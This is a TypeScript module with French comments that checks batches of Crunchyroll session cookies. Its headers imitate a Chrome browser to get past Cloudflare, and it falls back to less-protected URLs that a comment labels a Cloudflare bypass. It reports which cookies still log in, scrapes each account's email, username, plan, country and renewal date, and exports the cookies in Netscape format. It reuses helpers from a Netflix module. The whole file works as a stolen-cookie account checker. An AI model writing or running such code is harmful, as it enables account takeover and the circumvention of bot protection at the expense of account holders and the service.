import type { CookieBatch, ValidationResult } from "~/lib/netflix.server";
import { formatBatchNetscape } from "~/lib/netflix.server";

export async function validateCrunchyrollBatch(batch: CookieBatch): Promise<ValidationResult> {
  if (batch.cookies.length === 0) {
    return {
      batchIndex: batch.index,
      isValid: false,
      message: "Aucun cookie trouvé",
      netflixId: null,
      cookiesData: batch.cookies,
      accountInfo: {},
      netscapeFormat: formatBatchNetscape(batch.cookies),
    };
  }

  const cookieHeader = batch.cookies.map((c) => `${c.name}=${c.value}`).join("; ");

  // Headers qui imitent un vrai navigateur Chrome pour passer Cloudflare
  const headers: Record<string, string> = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "Cookie": cookieHeader,
  };

  try {
    const resp = await fetch("https://www.crunchyroll.com/fr/discover", {
      headers,
      redirect: "follow",
    });

    const finalUrl = resp.url;
    const status = resp.status;

    // Cookie invalide → redirigé vers login/welcome
    const isLoginRedirect =
      finalUrl.toLowerCase().includes("/login") ||
      finalUrl.toLowerCase().includes("/welcome") ||
      finalUrl.toLowerCase().includes("sso.crunchyroll") ||
      finalUrl.toLowerCase().includes("/auth");

    if (isLoginRedirect) {
      return {
        batchIndex: batch.index,
        isValid: false,
        message: "Cookie invalide - Redirection vers login",
        netflixId: null,
        cookiesData: batch.cookies,
        accountInfo: { final_url: finalUrl, status_code: status },
        netscapeFormat: formatBatchNetscape(batch.cookies),
      };
    }

    // Cloudflare challenge
    if (status === 403 || status === 503) {
      // Essayer une URL alternative moins protégée
      return await tryAlternativeUrl(batch, cookieHeader, status, finalUrl);
    }

    if (status === 200) {
      const html = await resp.text();
      const info = extractAccountInfo(html);
      info.final_url = finalUrl;
      info.status_code = status;

      // Vérifier qu'on est bien connecté : Crunchyroll injecte les données user dans le HTML
      const isLoggedIn =
        html.includes('"isLoggedIn":true') ||
        html.includes('"is_logged_in":true') ||
        html.includes('"account_id"') ||
        html.includes('"etp_guid"') ||
        finalUrl.includes("/discover");

      if (!isLoggedIn && !finalUrl.includes("/discover")) {
        return {
          batchIndex: batch.index,
          isValid: false,
          message: `Cookie invalide - Non connecté (${finalUrl})`,
          netflixId: null,
          cookiesData: batch.cookies,
          accountInfo: info,
          netscapeFormat: formatBatchNetscape(batch.cookies),
        };
      }

      return {
        batchIndex: batch.index,
        isValid: true,
        message: "Cookie Crunchyroll valide",
        netflixId: null,
        cookiesData: batch.cookies,
        accountInfo: info,
        netscapeFormat: formatBatchNetscape(batch.cookies),
      };
    }

    return {
      batchIndex: batch.index,
      isValid: false,
      message: `Statut HTTP ${status} - URL: ${finalUrl}`,
      netflixId: null,
      cookiesData: batch.cookies,
      accountInfo: { final_url: finalUrl, status_code: status },
      netscapeFormat: formatBatchNetscape(batch.cookies),
    };

  } catch (err) {
    return {
      batchIndex: batch.index,
      isValid: false,
      message: `Erreur: ${err instanceof Error ? err.message : "Inconnue"}`,
      netflixId: null,
      cookiesData: batch.cookies,
      accountInfo: {},
      netscapeFormat: formatBatchNetscape(batch.cookies),
    };
  }
}

/**
 * Fallback : si /fr/discover est bloqué par CF, tenter l'API interne
 * qui n'est pas derrière Cloudflare
 */
async function tryAlternativeUrl(
  batch: CookieBatch,
  cookieHeader: string,
  originalStatus: number,
  originalUrl: string
): Promise<ValidationResult> {
  const headers: Record<string, string> = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "fr-FR,fr;q=0.9",
    "Referer": "https://www.crunchyroll.com/",
    "Cookie": cookieHeader,
  };

  try {
    // L'endpoint de profil n'est pas derrière Cloudflare
    const profileResp = await fetch("https://www.crunchyroll.com/auth/v1/token", {
      method: "HEAD",
      headers,
      redirect: "follow",
    });

    // Tenter /home qui est souvent moins protégé
    const homeResp = await fetch("https://www.crunchyroll.com/fr", {
      headers: {
        ...headers,
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
      },
      redirect: "follow",
    });

    const finalUrl = homeResp.url;
    const status = homeResp.status;

    if (status === 200 && !finalUrl.toLowerCase().includes("login")) {
      const html = await homeResp.text();
      const info = extractAccountInfo(html);
      info.final_url = finalUrl;
      info.status_code = status;
      info.note = "validé via /fr (bypass CF)";

      return {
        batchIndex: batch.index,
        isValid: true,
        message: "Cookie Crunchyroll valide",
        netflixId: null,
        cookiesData: batch.cookies,
        accountInfo: info,
        netscapeFormat: formatBatchNetscape(batch.cookies),
      };
    }

    return {
      batchIndex: batch.index,
      isValid: false,
      message: `Cloudflare bloque la requête (${originalStatus}) - URL: ${originalUrl}`,
      netflixId: null,
      cookiesData: batch.cookies,
      accountInfo: { final_url: originalUrl, status_code: originalStatus, fallback_status: status, fallback_url: finalUrl },
      netscapeFormat: formatBatchNetscape(batch.cookies),
    };
  } catch (err) {
    return {
      batchIndex: batch.index,
      isValid: false,
      message: `Cloudflare bloque (${originalStatus}) - ${err instanceof Error ? err.message : ""}`,
      netflixId: null,
      cookiesData: batch.cookies,
      accountInfo: { final_url: originalUrl, status_code: originalStatus },
      netscapeFormat: formatBatchNetscape(batch.cookies),
    };
  }
}

function extractAccountInfo(html: string): Record<string, any> {
  const info: Record<string, any> = {};

  // Email
  const emailMatch = html.match(/"email"\s*:\s*"([^"]+)"/) ||
    html.match(/data-email="([^"]+)"/i);
  if (emailMatch) info.email = emailMatch[1];

  // Nom d'utilisateur
  const nameMatch =
    html.match(/"username"\s*:\s*"([^"]+)"/) ||
    html.match(/"display_name"\s*:\s*"([^"]+)"/) ||
    html.match(/"profile_name"\s*:\s*"([^"]+)"/) ||
    html.match(/"displayName"\s*:\s*"([^"]+)"/);
  if (nameMatch) info.display_name = nameMatch[1];

  // Plan / tier
  const tierMatch =
    html.match(/"tier"\s*:\s*"([^"]+)"/) ||
    html.match(/"subscription_type"\s*:\s*"([^"]+)"/) ||
    html.match(/"planId"\s*:\s*"([^"]+)"/);
  if (tierMatch) {
    const t = tierMatch[1].toLowerCase();
    if (t.includes("mega")) info.plan = "Mega Fan";
    else if (t.includes("fan") || t.includes("premium")) info.plan = "Fan";
    else if (t === "none" || t.includes("free")) info.plan = "Gratuit";
    else info.plan = tierMatch[1];
  }

  if (!info.plan) {
    if (html.includes('"isPremium":true') || html.includes('"is_premium":true')) info.plan = "Premium";
    else if (html.includes('"isPremium":false') || html.includes('"is_premium":false')) info.plan = "Gratuit";
  }

  // Pays
  const countryMatch =
    html.match(/"country_code"\s*:\s*"([^"]+)"/) ||
    html.match(/"country"\s*:\s*"([^"]+)"/);
  if (countryMatch) info.country = countryMatch[1];

  // Date renouvellement
  const renewalMatch =
    html.match(/"next_renewal_date"\s*:\s*"([^"]+)"/) ||
    html.match(/"expiration_date"\s*:\s*"([^"]+)"/);
  if (renewalMatch) info.next_billing_date = renewalMatch[1].split("T")[0];

  return info;
}
